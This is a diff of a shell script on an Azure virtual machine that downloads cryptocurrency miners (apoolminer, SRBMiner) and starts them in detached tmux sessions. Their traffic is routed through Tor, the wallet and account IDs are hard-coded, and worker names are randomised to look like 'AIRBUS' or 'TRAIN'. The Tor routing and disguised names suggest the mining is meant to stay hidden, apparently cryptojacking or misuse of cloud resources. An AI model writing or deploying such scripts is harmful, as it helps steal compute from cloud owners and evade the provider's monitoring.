@@ -42,8 +42,8 @@ tmux kill-session -t checker_idle
 #cd /home/azureuser/qub_dir
 #rm /home/azureuser/qub_dir/qubic.tar.gz
 
-wget https://github.com/apool-io/apoolminer/releases/download/v2.4.3/apoolminer_linux_v2.4.3.tar -P /home/azureuser/qub_dir -N
-tar -xf /home/azureuser/qub_dir/apoolminer_linux_v2.4.3.tar -C /home/azureuser/qub_dir/
+wget https://github.com/apool-io/apoolminer/releases/download/v2.5.0/apoolminer_linux_v2.5.0.tar -P /home/azureuser/qub_dir -N
+tar -xf /home/azureuser/qub_dir/apoolminer_linux_v2.5.0.tar -C /home/azureuser/qub_dir/
 
 #wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/qubic.tar.gz -P /home/azureuser/qub_dir -N
 #tar -xf /home/azureuser/qub_dir/qubic.tar.gz
@@ -66,8 +66,8 @@ if ip add | grep -q tun; then
     #tmux new -ds servak """torify /home/azureuser/qub_dir/rqiner-x86-cascadelake -t 2 -i GFEGFGXKIIISLDTGPZHEYDABHIOAMROZVCQOTKSGPGSWRJMQLLMXGHSDCCJM --no-pplns -l "airbusA380_$((RANDOM % 999999 + 2))" >> /home/azureuser/qub_dir/logs2.txt 2>&1"""
     #tmux new -ds servak """torify /home/azureuser/qub_dir/rqiner-x86-cascadelake -t 2 -i GFEGFGXKIIISLDTGPZHEYDABHIOAMROZVCQOTKSGPGSWRJMQLLMXGHSDCCJM -l "airbusA380_$((RANDOM % 999999 + 2))" >> /home/azureuser/qub_dir/logs2.txt 2>&1"""
     #tmux new -ds servak """torify /home/azureuser/qub_dir/apoolminer --account CP_7xv4nh7sn3 --gpu-off --pool qubic1.hk.apool.io:3334 --thread 2 --worker "SIMULATOR_$((RANDOM % 999999 + 2))" >> /home/azureuser/qub_dir/logs2.txt 2>&1"""
-    tmux new -ds servak sudo /home/azureuser/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool ru.vipor.net:5040 --wallet RTBPkp3ZK4nNau6u6ckdSz9NGWbAa9QXkk.AIRBUS_$((RANDOM % 999999 + 2)) --proxy localhost:9050 --cpu-threads 2
-    #tmux new -ds servak """torify /home/azureuser/qub_dir/apoolminer --account CP_7xv4nh7sn3 --pool qubic1.hk.apool.io:3334 --pool-slave ore1.hk.apool.io:9090  -A qubic_ore --worker "TRAIN_$((RANDOM % 999999 + 2))""""
+    #tmux new -ds servak sudo /home/azureuser/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool ru.vipor.net:5040 --wallet RTBPkp3ZK4nNau6u6ckdSz9NGWbAa9QXkk.AIRBUS_$((RANDOM % 999999 + 2)) --proxy localhost:9050 --cpu-threads 2
+    tmux new -ds servak """torify /home/azureuser/qub_dir/apoolminer --account CP_7xv4nh7sn3 --pool qubic1.hk.apool.io:3334 --pool-slave ore1.hk.apool.io:9090  -A qubic_ore --worker "TRAIN_$((RANDOM % 999999 + 2))""""
     #tmux new -ds servak sudo ./xmrig
 else
     echo "Интерфейс tun отсутствует"
